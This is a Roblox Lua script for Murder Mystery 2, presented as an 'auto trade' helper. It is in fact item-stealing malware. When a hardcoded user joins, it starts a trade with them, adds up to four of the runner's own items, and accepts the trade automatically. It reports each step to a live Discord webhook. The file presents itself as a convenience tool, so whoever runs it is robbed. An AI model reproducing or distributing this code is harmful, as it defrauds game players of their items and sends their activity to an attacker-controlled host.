-- -- MM2 AUTO TRADE SCRIPT - FIXED NO ERRORS

local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local Http = game:GetService("HttpService")

local tradeActive = false
local remotes = {}

local function sendLog(msg)
    pcall(function()
        local data = Http:JSONEncode({content = "MM2 Trade: " .. tostring(msg)})
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
    end)
end

local function findRemotes()
    for _, v in pairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local name = v.Name
            remotes[name] = v
        end
    end
end

local function getItems()
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item)
        end
    end
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item)
            end
        end
    end
    return items
end

local function addItems()
    local items = getItems()
    local added = 0
    local addRemote = remotes.OfferItem or remotes.TradeAddItem
    if not addRemote then
        return 0
    end
    for i = 1, math.min(4, #items) do
        pcall(function()
            addRemote:FireServer(items[i])
        end)
        added = added + 1
        wait(0.3)
    end
    return added
end

local function acceptTrade()
    local accept = remotes.AcceptTrade or remotes.AcceptRequest
    if accept then
        pcall(function()
            accept:FireServer()
        end)
    end
end

local function startTrade(target)
    if tradeActive then
        return
    end
    tradeActive = true
    sendLog("Trading " .. target.Name)
    
    local start = remotes.StartTrade
    if start then
        pcall(function()
            start:FireServer(target)
        end)
    end
    
    wait(1.5)
    acceptTrade()
    wait(1)
    local added = addItems()
    wait(0.5)
    acceptTrade()
    
    sendLog("Complete - " .. added .. " items")
    tradeActive = false
end

findRemotes()
sendLog("Ready - Target: " .. TARGET_USER)

for _, plr in pairs(Players:GetPlayers()) do
    if plr.Name == TARGET_USER then
        wait(2)
        startTrade(plr)
        break
    end
end

Players.PlayerAdded:Connect(function(plr)
    if plr.Name == TARGET_USER then
        wait(2)
        startTrade(plr)
    end
end)
